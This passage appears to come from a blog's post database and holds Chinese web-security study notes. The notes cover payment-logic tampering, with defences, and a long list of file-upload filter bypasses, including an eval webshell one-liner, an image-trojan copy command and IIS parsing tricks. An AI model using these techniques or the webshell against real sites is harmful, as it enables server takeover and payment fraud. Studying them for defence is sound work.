存在user=id这种传参，修改id，使用别人的钱包付钱\n* 无限制试用\n  * 试用的参数为2，正常购买的参数为1，购买参数2\n\n## 0x03 挖掘\n\n* 找到关键的数据包\n* 分析数据包\n\n## 0x04 防御方法\n\n* 后端检测每一项值，包括支付状态\n* 校验价格、数量参数\n* 与第三方支付平台检查\n* 支付参数进行MD5加密、解密、数字签名及验证\n* 金额超过阈值，进行人工审核","source":"_posts/支付漏洞.md","raw":"---\ntitle: 支付漏洞\ntoc: false\ndate: 2021-03-25 11:13:48\ndescription: 支付漏洞\ntags: Web安全\ncategories: Web安全\n---\n\n## 0x01 快捷支付原理\n\n* 浏览器进行跳转通知：基于用户访问的浏览器（基本没了）\n* 服务器端异步通知\n\n## 0x02 支付漏洞\n\n逻辑漏洞，支付三部曲：订购、订单、付款\n\n* 修改支付价格\n  * 三个步骤中随意一个步骤进行修改价格测试，可以尝试小金额或负数\n* 修改支付状态\n  * 订单完成——未完成\n* 修改订单数量\n  * 一支笔1元，买0支或者-1支\n* 修改附属值\n  * 优惠券，修改金额大于或等于商品的价格，或者直接修改为负数\n* 越权支付\n  * 存在user=id这种传参，修改id，使用别人的钱包付钱\n* 无限制试用\n  * 试用的参数为2，正常购买的参数为1，购买参数2\n\n## 0x03 挖掘\n\n* 找到关键的数据包\n* 分析数据包\n\n## 0x04 防御方法\n\n* 后端检测每一项值，包括支付状态\n* 校验价格、数量参数\n* 与第三方支付平台检查\n* 支付参数进行MD5加密、解密、数字签名及验证\n* 金额超过阈值，进行人工审核","slug":"支付漏洞","published":1,"updated":"2021-03-25T06:28:53.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckqmbe9nw001cicsw68fihakz","content":"<h2 id=\"0x01-快捷支付原理\"><a href=\"#0x01-快捷支付原理\" class=\"headerlink\" title=\"0x01 快捷支付原理\"></a>0x01 快捷支付原理</h2><ul>\n<li>浏览器进行跳转通知：基于用户访问的浏览器（基本没了）</li>\n<li>服务器端异步通知</li>\n</ul>\n<h2 id=\"0x02-支付漏洞\"><a href=\"#0x02-支付漏洞\" class=\"headerlink\" title=\"0x02 支付漏洞\"></a>0x02 支付漏洞</h2><p>逻辑漏洞，支付三部曲：订购、订单、付款</p>\n<ul>\n<li>修改支付价格<ul>\n<li>三个步骤中随意一个步骤进行修改价格测试，可以尝试小金额或负数</li>\n</ul>\n</li>\n<li>修改支付状态<ul>\n<li>订单完成——未完成</li>\n</ul>\n</li>\n<li>修改订单数量<ul>\n<li>一支笔1元，买0支或者-1支</li>\n</ul>\n</li>\n<li>修改附属值<ul>\n<li>优惠券，修改金额大于或等于商品的价格，或者直接修改为负数</li>\n</ul>\n</li>\n<li>越权支付<ul>\n<li>存在user=id这种传参，修改id，使用别人的钱包付钱</li>\n</ul>\n</li>\n<li>无限制试用<ul>\n<li>试用的参数为2，正常购买的参数为1，购买参数2</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"0x03-挖掘\"><a href=\"#0x03-挖掘\" class=\"headerlink\" title=\"0x03 挖掘\"></a>0x03 挖掘</h2><ul>\n<li>找到关键的数据包</li>\n<li>分析数据包</li>\n</ul>\n<h2 id=\"0x04-防御方法\"><a href=\"#0x04-防御方法\" class=\"headerlink\" title=\"0x04 防御方法\"></a>0x04 防御方法</h2><ul>\n<li>后端检测每一项值，包括支付状态</li>\n<li>校验价格、数量参数</li>\n<li>与第三方支付平台检查</li>\n<li>支付参数进行MD5加密、解密、数字签名及验证</li>\n<li>金额超过阈值，进行人工审核</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"0x01-快捷支付原理\"><a href=\"#0x01-快捷支付原理\" class=\"headerlink\" title=\"0x01 快捷支付原理\"></a>0x01 快捷支付原理</h2><ul>\n<li>浏览器进行跳转通知：基于用户访问的浏览器（基本没了）</li>\n<li>服务器端异步通知</li>\n</ul>\n<h2 id=\"0x02-支付漏洞\"><a href=\"#0x02-支付漏洞\" class=\"headerlink\" title=\"0x02 支付漏洞\"></a>0x02 支付漏洞</h2><p>逻辑漏洞，支付三部曲：订购、订单、付款</p>\n<ul>\n<li>修改支付价格<ul>\n<li>三个步骤中随意一个步骤进行修改价格测试，可以尝试小金额或负数</li>\n</ul>\n</li>\n<li>修改支付状态<ul>\n<li>订单完成——未完成</li>\n</ul>\n</li>\n<li>修改订单数量<ul>\n<li>一支笔1元，买0支或者-1支</li>\n</ul>\n</li>\n<li>修改附属值<ul>\n<li>优惠券，修改金额大于或等于商品的价格，或者直接修改为负数</li>\n</ul>\n</li>\n<li>越权支付<ul>\n<li>存在user=id这种传参，修改id，使用别人的钱包付钱</li>\n</ul>\n</li>\n<li>无限制试用<ul>\n<li>试用的参数为2，正常购买的参数为1，购买参数2</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"0x03-挖掘\"><a href=\"#0x03-挖掘\" class=\"headerlink\" title=\"0x03 挖掘\"></a>0x03 挖掘</h2><ul>\n<li>找到关键的数据包</li>\n<li>分析数据包</li>\n</ul>\n<h2 id=\"0x04-防御方法\"><a href=\"#0x04-防御方法\" class=\"headerlink\" title=\"0x04 防御方法\"></a>0x04 防御方法</h2><ul>\n<li>后端检测每一项值，包括支付状态</li>\n<li>校验价格、数量参数</li>\n<li>与第三方支付平台检查</li>\n<li>支付参数进行MD5加密、解密、数字签名及验证</li>\n<li>金额超过阈值，进行人工审核</li>\n</ul>\n"},{"title":"Plan","toc":false,"date":"2021-07-02T12:27:43.000Z","description":null,"_content":"\n# 五年计划\n\n","source":"_posts/Plan.md","raw":"---\ntitle: Plan\ntoc: false\ndate: 2021-07-02 20:27:43\ndescription:\ntags: Web安全\ncategories: Web安全\n---\n\n# 五年计划\n\n","slug":"Plan","published":1,"updated":"2021-07-02T12:30:05.884Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckqmbe9nw001hicswc9ohh1e8","content":"<h1 id=\"五年计划\"><a href=\"#五年计划\" class=\"headerlink\" title=\"五年计划\"></a>五年计划</h1>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"五年计划\"><a href=\"#五年计划\" class=\"headerlink\" title=\"五年计划\"></a>五年计划</h1>"},{"title":"文件上传","toc":false,"date":"2021-03-24T07:56:16.000Z","description":"文件上传","_content":"\n## 0x01 前端验证绕过\n\n- 前端校验 = 没有校验\n- 将一句话木马文件后缀改成可以通过的文件类型\n- 用Brup抓包修改后缀为.php\n\n## 0x02 Content-Type方式绕过\n\n- 将一句话木马文件后缀改成可以通过的文件类型\n\n- 用Brup抓包修改Content-Type为可以通过的文件类型\n\n- - 可以通过上传可以通过的文件查看相应的格式\n\n## 0x03 黑名单绕过\n\n- 不允许上传asp,aspx,php,jsp后缀文件\n\n- 尝试改成解析后一样作用的后缀上传\n\n- - jsp jspx jspf等\n  - asp asa cer aspx等\n  - php phtml php3 php4等\n  - exe exee等\n\n## 0x04 .htaccess文件绕过\n\n- 将所有解析后作用相同的后缀全部加入了黑名单\n\n- 超文本入口(.htaccess)，也被称为分布式配置文件,Apache中存在，但是默认关闭\n\n- - AddType application/x-http-php .jpg 代表jpg文件会被当成php文件执行\n\n## 0x05 后缀大小写绕过\n\n- 将一句话木马文件后缀改成可以通过的文件类型\n\n- 将一句话木马文件后缀改成相应的大小写后缀\n\n- - PHp等\n\n## 0x06 文件后缀(空)绕过\n\n- 大小写被强制转换成小写\n- 将一句话木马文件后缀改成可以通过的文件类型\n- 将一句话木马文件后缀后面加一个空格\n\n## 0x07 文件后缀(点)绕过\n\n- 文件后缀的前后空格被强制删除\n- 将一句话木马文件后缀改成可以通过的文件类型\n- 将一句话木马文件后缀后面加一个点\n\n## 0x08 Windows文件流绕过(::$DATA)\n\n- 文件后缀末尾的点被强行删除\n- 将一句话木马文件后缀改成可以通过的文件类型\n- 将一句话木马文件后缀后面加::$DATA\n\n## 0x09 构造文件后缀绕过\n\n- 文件后缀末尾不允许加::$DATA\n- 将一句话木马文件后缀改成可以通过的文件类型\n- 将一句话木马文件后缀后面加点空点\n\n## 0x10 双写文件后缀绕过\n\n- 设置str_ireplace函数将php替换成空格\n- 将一句话木马文件后缀改成可以通过的文件类型\n- 将一句话木马文件后缀修改成为pphphp\n\n## 0x11 %00截断绕过(PHP5.3以下可用)\n\n### GET传参\n\n- 将一句话木马文件后缀改成可以通过的文件类型\n- 用Brup抓包，在上传路径/upload/后加上1.php%00将白名单机制加上的东西给截断不执行\n\n### POST传参\n\n- 将一句话木马文件后缀改成可以通过的文件类型\n- 用Brup抓包，在上传路径/upload/后加上1.phpa，a的16进制是61，在Hex中找到他将他改成%00对应的00进行截断\n\n## 0x12 图片马绕过\n\n- 检测文件内的内容是不是图片，不是就不给上传\n- 将一张图片和一个一句话木马使用`copy 1.jpg/b + 1.txt 123.jpg` 命令合成一张图片马\n\n## 0x13 getimagesize图片类型绕过\n\n- 上传正常类型的图片查看是否能够正常上传\n- 换个图片类型进行图片马制作上传\n\n## 0x14 php_exif模块图片类型绕过\n\n- 上同\n\n## 0x15 二次渲染绕过\n\n- 发现上传上去的图片和下载下来的图片不一样时，说明可能进行了二次渲染\n- 使用gif文件制作图片马，将图片用Hex打开，从第三行开始输入一句话木马\n\n## 0x16 move_uploaded_file()截断\n\n- 同00截断，只不过00截断截的是路径，而这个截的是图片名字\n\n- 将图片名截断\n\n- - 1.phpa.jpg使用Hex将a的61改成00\n\n## 0x17 条件竞争绕过\n\n- 先上传再检测才有用\n- 就算上传成功也会在一瞬间被删除，所以用到了`file_put_contents` 函数\n- file_put_contents('1.php','<?php eval($REQUEST[8]); ?>')\n- 利用Brup跑包访问上传了图片马并加上上一条函数作为参数的网站，访问到的一瞬间会执行`file_put_contents` 函数在服务器中写入一句话木马文件1.php\n\n## 0x18 IIS6.0解析漏洞\n\n### 一\n\n- IIS6.0在应用程序扩展中默认设置了.asa .cer .cdx都会调用asp.dll\n- 利用asp一句话木马文件1.cer制作图片马\n- 利用Brup抓包修改文件后缀名为.cer上传\n\n### 二\n\n- 针对IIS6.0有效\n\n- IIS6.0在处理含有特殊符号的文件路径时会出现逻辑错误，造成文件解析漏洞，两种不同的利用方式都会被当作asp进行解析\n\n- - test.asp;.jpg\n  - test.asp/123.jpg\n\n- 上传文件时直接修改文件名后缀\n\n### 三\n\n- 设置了上传存储的文件夹名为a.asp，所有上传到这个文件夹的文件都会被当做asp文件解析执行\n\n## 0x19 CGI解析漏洞\n\n- 仅用于PHP\n- IIS7.5最多 Nginx IIS高版本都会有\n- 随便上传一张图片马，访问图片网址后加上/.php就会被执行一句话木马文件","source":"_posts/文件上传.md","raw":"---\ntitle: 文件上传\ntoc: false\ndate: 2021-03-24 15:56:16\ndescription: 文件上传\ntags: Web安全\ncategories: Web安全\n---\n\n## 0x01 前端验证绕过\n\n- 前端校验 = 没有校验\n- 将一句话木马文件后缀改成可以通过的文件类型\n- 用Brup抓包修改后缀为.php\n\n## 0x02 Content-Type方式绕过\n\n- 将一句话木马文件后缀改成可以通过的文件类型\n\n- 用Brup抓包修改Content-Type为可以通过的文件类型\n\n- - 可以通过上传可以通过的文件查看相应的格式\n\n## 0x03 黑名单绕过\n\n- 不允许上传asp,aspx,php,jsp后缀文件\n\n- 尝试改成解析后一样作用的后缀上传\n\n- - jsp jspx jspf等\n  - asp asa cer aspx等\n  - php phtml php3 php4等\n  - exe exee等\n\n## 0x04 .htaccess文件绕过\n\n- 将所有解析后作用相同的后缀全部加入了黑名单\n\n- 超文本入口(.htaccess)，也被称为分布式配置文件,Apache中存在，但是默认关闭\n\n- - AddType application/x-http-php .jpg 代表jpg文件会被当成php文件执行\n\n## 0x05 后缀大小写绕过\n\n- 将一句话木马文件后缀改成可以通过的文件类型\n\n- 将一句话木马文件后缀改成相应的大小写后缀\n\n- - PHp等\n\n## 0x06 文件后缀(空)绕过\n\n- 大小写被强制转换成小写\n- 将一句话木马文件后缀改成可以通过的文件类型\n- 将一句话木马文件后缀后面加一个空格\n\n## 0x07 文件后缀(点)绕过\n\n- 文件后缀的前后空格被强制删除\n- 将一句话木马文件后缀改成可以通过的文件类型\n- 将一句话木马文件后缀后面加一个点\n\n## 0x08 Windows文件流绕过(::$DATA)\n\n- 文件后缀末尾的点被强行删除\n- 将一句话木马文件后缀改成可以通过的文件类型\n- 将一句话木马文件后缀后面加::$DATA\n\n## 0x09 构造文件后缀绕过\n\n- 文件后缀末尾不允许加::$DATA\n- 将一句话木马文件后缀改成可以通过的文件类型\n- 将一句话木马文件后缀后面加点空点\n\n## 0x10 双写文件后缀绕过\n\n- 设置str_ireplace函数将php替换成空格\n- 将一句话木马文件后缀改成可以通过的文件类型\n- 将一句话木马文件后缀修改成为pphphp\n\n## 0x11 %00截断绕过(PHP5.3以下可用)\n\n### GET传参\n\n- 将一句话木马文件后缀改成可以通过的文件类型\n- 用Brup抓包，在上传路径/upload/后加上1.php%00将白名单机制加上的东西给截断不执行\n\n### POST传参\n\n- 将一句话木马文件后缀改成可以通过的文件类型\n- 用Brup抓包，在上传路径/upload/后加上1.phpa，a的16进制是61，在Hex中找到他将他改成%00对应的00进行截断\n\n## 0x12 图片马绕过\n\n- 检测文件内的内容是不是图片，不是就不给上传\n- 将一张图片和一个一句话木马使用`copy 1.jpg/b + 1.txt 123.jpg` 命令合成一张图片马\n\n## 0x13 getimagesize图片类型绕过\n\n- 上传正常类型的图片查看是否能够正常上传\n- 换个图片类型进行图片马制作上传\n\n## 0x14 php_exif模块图片类型绕过\n\n- 上同\n\n## 0x15 二次渲染绕过\n\n- 发现上传上去的图片和下载下来的图片不一样时，说明可能进行了二次渲染\n- 使用gif文件制作图片马，将图片用Hex打开，从第三行开始输入一句话木马\n\n## 0x16 move_uploaded_file()截断\n\n- 同00截断，只不过00截断截的是路径，而这个截的是图片名字\n\n- 将图片名截断\n\n- - 1.phpa.jpg使用Hex将a的61改成00\n\n## 0x17 条件竞争绕过\n\n- 先上传再检测才有用\n- 就算上传成功也会在一瞬间被删除，所以用到了`file_put_contents` 函数\n- file_put_contents('1.php','<?php eval($REQUEST[8]); ?>')\n- 利用Brup跑包访问上传了图片马并加上上一条函数作为参数的网站，访问到的一瞬间会执行`file_put_contents` 函数在服务器中写入一句话木马文件1.php\n\n## 0x18 IIS6.0解析漏洞\n\n### 一\n\n- IIS6.0在应用程序扩展中默认设置了.asa .cer .cdx都会调用asp.dll\n- 利用asp一句话木马文件1.cer制作图片马\n- 利用Brup抓包修改文件后缀名为.cer上传\n\n### 二\n\n- 针对IIS6.0有效\n\n- IIS6.0在处理含有特殊符号的文件路径时会出现逻辑错误，造成文件解析漏洞，两种不同的利用方式都会被当作asp进行解析\n\n- - test.asp;.jpg\n  - test.asp/123.jpg\n\n- 上传文件时直接修改文件名后缀\n\n### 三\n\n- 设置了上传存储的文件夹名为a.asp，所有上传到这个文件夹的文件都会被当做asp文件解析执行\n\n## 0x19 CGI解析漏洞\n\n- 仅用于PHP\n- IIS7.5最多 Nginx IIS高版本都会有\n- 随便上传一张图片马，访问图片网址后加上/.php就会被执行一句话木马文件","slug":"文件上传","published":1,"updated":"2021-03-24T07:56:43.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckqmbe9nx001kicswgkxg8nj1","content":"<h2 id=\"0x01-前端验证绕过\"><a href=\"#0x01-前端验证绕过\" class=\"headerlink\" title=\"0x01 前端验证绕过\"></a>0x01 前端验证绕过</h2><ul>\n<li>前端校验 = 没有校验</li>\n<li>将一句话木马文件后缀改成可以通过的文件类型</li>\n<li>用Brup抓包修改后缀为.php</li>\n</ul>\n<h2 id=\"0x02-Content-Type方式绕过\"><a href=\"#0x02-Content-Type方式绕过\" class=\"headerlink\" title=\"0x02 Content-Type方式绕过\"></a>0x02 Content-Type方式绕过</h2><ul>\n<li><p>将一句话木马文件后缀改成可以通过的文件类型</p>\n</li>\n<li><p>用Brup抓包修改Content-Type为可以通过的文件类型</p>\n</li>\n<li><ul>\n<li>可以通过上传可以通过的文件查看相应的格式</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"0x03-黑名单绕过\"><a href=\"#0x03-黑名单绕过\" class=\"headerlink\" title=\"0x03 黑名单绕过\"></a>0x03 黑名单绕过</h2><ul>\n<li><p>不允许上传asp,aspx,php,jsp后缀文件</p>\n</li>\n<li><p>尝试改成解析后一样作用的后缀上传</p>\n</li>\n<li><ul>\n<li>jsp jspx jspf等</li>\n<li>asp asa cer aspx等</li>\n<li>php phtml php3 php4等</li>\n<li>exe exee等</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"0x04-htaccess文件绕过\"><a href=\"#0x04-htaccess文件绕过\" class=\"headerlink\" title=\"0x04 .htaccess文件绕过\"></a>0x04 .htaccess文件绕过</h2><ul>\n<li><p>将所有解析后作用相同的后缀全部加入了黑名单</p>\n</li>\n<li><p>超文本入口(.htaccess)，也被称为分布式配置文件,Apache中存在，但是默认关闭</p>\n</li>\n<li><ul>\n<li>AddType application/x-http-php .jpg 代表jpg文件会被当成php文件执行</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"0x05-后缀大小写绕过\"><a href=\"#0x05-后缀大小写绕过\" class=\"headerlink\" title=\"0x05 后缀大小写绕过\"></a>0x05 后缀大小写绕过</h2><ul>\n<li><p>将一句话木马文件后缀改成可以通过的文件类型</p>\n</li>\n<li><p>将一句话木马文件后缀改成相应的大小写后缀</p>\n</li>\n<li><ul>\n<li>PHp等</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"0x06-文件后缀-空-绕过\"><a href=\"#0x06-文件后缀-空-绕过\" class=\"headerlink\" title=\"0x06 文件后缀(空)绕过\"></a>0x06 文件后缀(空)绕过</h2><ul>\n<li>大小写被强制转换成小写</li>\n<li>将一句话木马文件后缀改成可以通过的文件类型</li>\n<li>将一句话木马文件后缀后面加一个空格</li>\n</ul>\n<h2 id=\"0x07-文件后缀-点-绕过\"><a href=\"#0x07-文件后缀-点-绕过\" class=\"headerlink\" title=\"0x07 文件后缀(点)绕过\"></a>0x07 文件后缀(点)绕过</h2><ul>\n<li>文件后缀的前后空格被强制删除</li>\n<li>将一句话木马文件后缀改成可以通过的文件类型</li>\n<li>将一句话木马文件后缀后面加一个点</li>\n</ul>\n<h2 id=\"0x08-Windows文件流绕过-DATA\"><a href=\"#0x08-Windows文件流绕过-DATA\" class=\"headerlink\" title=\"0x08 Windows文件流绕过(::$DATA)\"></a>0x08 Windows文件流绕过(::$DATA)</h2><ul>\n<li>文件后缀末尾的点被强行删除</li>\n<li>将一句话木马文件后缀改成可以通过的文件类型</li>\n<li>将一句话木马文件后缀后面加::$DATA</li>\n</ul>\n<h2 id=\"0x09-构造文件后缀绕过\"><a href=\"#0x09-构造文件后缀绕过\" class=\"headerlink\" title=\"0x09 构造文件后缀绕过\"></a>0x09 构造文件后缀绕过</h2><ul>\n<li>文件后缀末尾不允许加::$DATA</li>\n<li>将一句话木马文件后缀改成可以通过的文件类型</li>\n<li>将一句话木马文件后缀后面加点空点</li>\n</ul>\n<h2 id=\"0x10-双写文件后缀绕过\"><a href=\"#0x10-双写文件后缀绕过\" class=\"headerlink\" title=\"0x10 双写文件后缀绕过\"></a>0x10 双写文件后缀绕过</h2><ul>\n<li>设置str_ireplace函数将php替换成空格</li>\n<li>将一句话木马文件后缀改成可以通过的文件类型</li>\n<li>将一句话木马文件后缀修改成为pphphp</li>\n</ul>\n<h2 id=\"0x11-00截断绕过-PHP5-3以下可用\"><a href=\"#0x11-00截断绕过-PHP5-3以下可用\" class=\"headerlink\" title=\"0x11 %00截断绕过(PHP5.3以下可用)\"></a>0x11 %00截断绕过(PHP5.3以下可用)</h2><h3 id=\"GET传参\"><a href=\"#GET传参\" class=\"headerlink\" title=\"GET传参\"></a>GET传参</h3><ul>\n<li>将一句话木马文件后缀改成可以通过的文件类型</li>\n<li>用Brup抓包，在上传路径/upload/后加上1.php%00将白名单机制加上的东西给截断不执行</li>\n</ul>\n<h3 id=\"POST传参\"><a href=\"#POST传参\" class=\"headerlink\" title=\"POST传参\"></a>POST传参</h3><ul>\n<li>将一句话木马文件后缀改成可以通过的文件类型</li>\n<li>用Brup抓包，在上传路径/upload/后加上1.phpa，a的16进制是61，在Hex中找到他将他改成%00对应的00进行截断</li>\n</ul>\n<h2 id=\"0x12-图片马绕过\"><a href=\"#0x12-图片马绕过\" class=\"headerlink\" title=\"0x12 图片马绕过\"></a>0x12 图片马绕过</h2><ul>\n<li>检测文件内的内容是不是图片，不是就不给上传</li>\n<li>将一张图片和一个一句话木马使用<code>copy 1.jpg/b + 1.txt 123.jpg</code> 命令合成一张图片马</li>\n</ul>\n<h2 id=\"0x13-getimagesize图片类型绕过\"><a href=\"#0x13-getimagesize图片类型绕过\" class=\"headerlink\" title=\"0x13 getimagesize图片类型绕过\"></a>0x13 getimagesize图片类型绕过</h2><ul>\n<li>上传正常类型的图片查看是否能够正常上传</li>\n<li>换个图片类型进行图片马制作上传</li>\n</ul>\n<h2 id=\"0x14-php-exif模块图片类型绕过\"><a href=\"#0x14-php-exif模块图片类型绕过\" class=\"headerlink\" title=\"0x14 php_exif模块图片类型绕过\"></a>0x14 php_exif模块图片类型绕过</h2><ul>\n<li>上同</li>\n</ul>\n<h2 id=\"0x15-二次渲染绕过\"><a href=\"#0x15-二次渲染绕过\" class=\"headerlink\" title=\"0x15 二次渲染绕过\"></a>0x15 二次渲染绕过</h2><ul>\n<li>发现上传上去的图片和下载下来的图片不一样时，说明可能进行了二次渲染</li>\n<li>使用gif文件制作图片马，将图片用Hex打开，从第三行开始输入一句话木马</li>\n</ul>\n<h2 id=\"0x16-move-uploaded-file-截断\"><a href=\"#0x16-move-uploaded-file-截断\" class=\"headerlink\" title=\"0x16 move_uploaded_file()截断\"></a>0x16 move_uploaded_file()截断</h2><ul>\n<li><p>同00截断，只不过00截断截的是路径，而这个截的是图片名字</p>\n</li>\n<li><p>将图片名截断</p>\n</li>\n<li><ul>\n<li>1.phpa.jpg使用Hex将a的61改成00</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"0x17-条件竞争绕过\"><a href=\"#0x17-条件竞争绕过\" class=\"headerlink\" title=\"0x17 条件竞争绕过\"></a>0x17 条件竞争绕过</h2><ul>\n<li>先上传再检测才有用</li>\n<li>就算上传成功也会在一瞬间被删除，所以用到了<code>file_put_contents</code> 函数</li>\n<li>file_put_contents(‘1.php’,’<?php eval($REQUEST[8]); ?>‘)</li>\n<li>利用Brup跑包访问上传了图片马并加上上一条函数作为参数的网站，访问到的一瞬间会执行<code>file_put_contents</code> 函数在服务器中写入一句话木马文件1.php</li>\n</ul>\n<h2 id=\"0x18-IIS6-0解析漏洞\"><a href=\"#0x18-IIS6-0解析漏洞\" class=\"headerlink\" title=\"0x18 IIS6.0解析漏洞\"></a>0x18 IIS6.0解析漏洞</h2><h3 id=\"一\"><a href=\"#一\" class=\"headerlink\" title=\"一\"></a>一</h3><ul>\n<li>IIS6.0在应用程序扩展中默认设置了.asa .cer .cdx都会调用asp.dll</li>\n<li>利用asp一句话木马文件1.cer制作图片马</li>\n<li>利用Brup抓包修改文件后缀名为.cer上传</li>\n</ul>\n<h3 id=\"二\"><a href=\"#二\" class=\"headerlink\" title=\"二\"></a>二</h3><ul>\n<li><p>针对IIS6.0有效</p>\n</li>\n<li><p>IIS6.0在处理含有特殊符号的文件路径时会出现逻辑错误，造成文件解析漏洞，两种不同的利用方式都会被当作asp进行解析</p>\n</li>\n<li><ul>\n<li>test.asp;.jpg</li>\n<li>test.asp/123.jpg</li>\n</ul>\n</li>\n<li><p>上传文件时直接修改文件名后缀</p>\n</li>\n</ul>\n<h3 id=\"三\"><a href=\"#三\" class=\"headerlink\" title=\"三\"></a>三</h3><ul>\n<li>设置了上传存储的文件夹名为a.asp，所有上传到这个文件夹的文件都会被当做asp文件解析执行</li>\n</ul>\n<h2 id=\"0x19-CGI解析漏洞\"><a href=\"#0x19-CGI解析漏洞\" class=\"headerlink\" title=\"0x19 CGI解析漏洞\"></a>0x19 CGI解析漏洞</h2><ul>\n<li>仅用于PHP</li>\n<li>IIS7.5最多 Nginx IIS高版本都会有</li>\n<li>随便上传一张图片马，访问图片网址后加上/.php就会被执行一句话木马文件</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"0x01-前端验证绕过\"><a href=\"#0x01-前端验证绕过\" class=\"headerlink\" title=\"0x01 前端验证绕过\"></a>0x01 前端验证绕过</h2><ul>\n<li>前端校验 = 没有校验</li>\n<li>将一句话木马文件后缀改成可以通过的文件类型</li>\n<li>用Brup抓包修改后缀为.php</li>\n</ul>\n<h2 id=\"0x02-Content-Type方式绕过\"><a href=\"#0x02-Content-Type方式绕过\" class=\"headerlink\" title=\"0x02 Content-Type方式绕过\"></a>0x02 Content-Type方式绕过</h2><ul>\n<li><p>将一句话木马文件后缀改成可以通过的文件类型</p>\n</li>\n<li><p>用Brup抓包修改Content-Type为可以通过的文件类型</p>\n</li>\n<li><ul>\n<li>可以通过上传可以通过的文件查看相应的格式</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"0x03-黑名单绕过\"><a href=\"#0x03-黑名单绕过\" class=\"headerlink\" title=\"0x03 黑名单绕过\"></a>0x03 黑名单绕过</h2><ul>\n<li><p>不允许上传asp,aspx,php,jsp后缀文件</p>\n</li>\n<li><p>尝试改成解析后一样作用的后缀上传</p>\n</li>\n<li><ul>\n<li>jsp jspx jspf等</li>\n<li>asp asa cer aspx等</li>\n<li>php phtml php3 php4等</li>\n<li>exe exee等</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"0x04-htaccess文件绕过\"><a href=\"#0x04-htaccess文件绕过\" class=\"headerlink\" title=\"0x04 .htaccess文件绕过\"></a>0x04 .htaccess文件绕过</h2><ul>\n<li><p>将所有解析后作用相同的后缀全部加入了黑名单</p>\n</li>\n<li><p>超文本入口(.htaccess)，也被称为分布式配置文件,Apache中存在，但是默认关闭</p>\n</li>\n<li><ul>\n<li>AddType application/x-http-php .jpg 代表jpg文件会被当成php文件执行</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"0x05-后缀大小写绕过\"><a href=\"#0x05-后缀大小写绕过\" class=\"headerlink\" title=\"0x05 后缀大小写绕过\"></a>0x05 后缀大小写绕过</h2><ul>\n<li><p>将一句话木马文件后缀改成可以通过的文件类型</p>\n</li>\n<li><p>将一句话木马文件后缀改成相应的大小写后缀</p>\n</li>\n<li><ul>\n<li>PHp等</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"0x06-文件后缀-空-绕过\"><a href=\"#0x06-文件后缀-空-绕过\" class=\"headerlink\" title=\"0x06 文件后缀(空)绕过\"></a>0x06 文件后缀(空)绕过</h2><ul>\n<li>大小写被强制转换成小写</li>\n<li>将一句话木马文件后缀改成可以通过的文件类型</li>\n<li>将一句话木马文件后缀后面加一个空格</li>\n</ul>\n<h2 id=\"0x07-文件后缀-点-绕过\"><a href=\"#0x07-文件后缀-点-绕过\" class=\"headerlink\" title=\"0x07 文件后缀(点)绕过\"></a>0x07 文件后缀(点)绕过</h2><ul>\n<li>文件后缀的前后空格被强制删除</li>\n<li>将一句话木马文件后缀改成可以通过的文件类型</li>\n<li>将一句话木马文件后缀后面加一个点</li>\n</ul>\n<h2 id=\"0x08-Windows文件流绕过-DATA\"><a href=\"#0x08-Windows文件流绕过-DATA\" class=\"headerlink\" title=\"0x08 Windows文件流绕过(::$DATA)\"></a>0x08 Windows文件流绕过(::$DATA)</h2><ul>\n<li>文件后缀末尾的点被强行删除</li>\n<li>将一句话木马文件后缀改成可以通过的文件类型</li>\n<li>将一句话木马文件后缀后面加::$DATA</li>\n</ul>\n<h2 id=\"0x09-构造文件后缀绕过\"><a href=\"#0x09-构造文件后缀绕过\" class=\"headerlink\" title=\"0x09 构造文件后缀绕过\"></a>0x09 构造文件后缀绕过</h2><ul>\n<li>文件后缀末尾不允许加::$DATA</li>\n<li>将一句话木马文件后缀改成可以通过的文件类型</li>\n<li>将一句话木马文件后缀后面加点空点</li>\n</ul>\n<h2 id=\"0x10-双写文件后缀绕过\"><a href=\"#0x10-双写文件后缀绕过\" class=\"headerlink\" title=\"0x10 双写文件后缀绕过\"></a>0x10 双写文件后缀绕过</h2><ul>\n<li>设置str_ireplace函数将php替换成空格</li>\n<li>将一句话木马文件后缀改成可以通过的文件类型</li>\n<li>将一句话木马文件后缀修改成为pphphp</li>\n</ul>\n<h2 id=\"0x11-00截断绕过-PHP5-3以下可用\"><a href=\"#0x11-00截断绕过-PHP5-3以下可用\" class=\"headerlink\" title=\"0x11 %00截断绕过(PHP5.3以下可用)\"></a>0x11 %00截断绕过(PHP5.3以下可用)</h2><h3 id=\"GET传参\"><a href=\"#GET传参\" class=\"headerlink\" title=\"GET传参\"></a>GET传参</h3><ul>\n<li>将一句话木马文件后缀改成可以通过的文件类型</li>\n<li>用Brup抓包，在上传路径/upload/后加上1.php%00将白名单机制加上的东西给截断不执行</li>\n</ul>\n<h3 id=\"POST传参\"><a href=\"#POST传参\" class=\"headerlink\" title=\"POST传参\"></a>POST传参</h3><ul>\n<li>将一句话木马文件后缀改成可以通过的文件类型</li>\n<li>用Brup抓包，在上传路径/upload/后加上1.phpa，a的16进制是61，在Hex中找到他将他改成%00对应的00进行截断</li>\n</ul>\n<h2 id=\"0x12-图片马绕过\"><a href=\"#0x12-图片马绕过\" class=\"headerlink\" title=\"0x12 图片马绕过\"></a>0x12 图片马绕过</h2><ul>\n<li>检测文件内的内容是不是图片，不是就不给上传</li>\n<li>将一张图片和一个一句话木马使用<code>copy 1.jpg/b + 1.txt 123.jpg</code> 命令合成一张图片马</li>\n</ul>\n<h2 id=\"0x13-getimagesize图片类型绕过\"><a href=\"#0x13-getimagesize图片类型绕过\" class=\"headerlink\" title=\"0x13 getimagesize图片类型绕过\"></a>0x13 